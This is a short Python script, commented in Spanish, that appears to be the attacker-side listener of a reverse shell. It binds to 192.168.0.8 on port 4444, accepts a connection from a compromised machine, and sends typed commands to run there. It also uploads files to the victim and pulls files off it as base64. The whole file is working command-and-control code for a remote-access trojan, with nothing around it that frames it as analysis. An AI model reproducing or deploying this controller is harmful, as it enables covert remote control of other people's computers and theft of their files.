import socket
import base64
import json

class Listener:
  def __init__(self, ip, port):
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    listener.bind((ip, port))
    listener.listen(0)
    print("[+] Esperando por conexiones")
    self.connection, address = listener.accept()
    print(f"[+] Tenemos una conexion de {str(address)}")
  def ejecutar_remotamente(self, comando):
    self.reliable_send(comando)
    return self.reliable_receive()

  def reliable_send(self, data):
      json_data = json.dumps(data).encode()
      self.connection.send(json_data)
  def reliable_receive(self):
    json_data = ""
    while True:
      try:
          json_data = json_data + self.connection.recv(1024).decode()
          return json.loads(json_data)
      except ValueError:
          continue

  def run(self):
    while True:
      comand = input(">> ")
      comand = comand.split()
      try:
        if comand[0] == "exit":
          break
        if comand[0] == "screenshot":
          print("Taking screenshot")
        if comand[0] == "subir":
          file_content = self.leer_archivo(comand[1])
          comand.append(file_content) 
        
        result = self.ejecutar_remotamente(comand)
 
        if comand[0] == "descargar" and "[-] Error " not in result:
          result = self.escribir_archivo(comand[1], result)      
      except:
          result = "[-] Error en el comando." 
      print(result)
    self.reliable_send("exit")
    print("Saliendo...")
    self.connection.close()
    exit()
    

  def escribir_archivo(self, path, content):
    with open(path, "wb") as file:
      file.write(base64.b64decode(content))
      return "[+] Descarga completa."

  def leer_archivo(self,path):
    with open(path, "rb") as file:
      return base64.b64encode(file.read())

escuchar = Listener("192.168.0.8", 4444)
escuchar.run()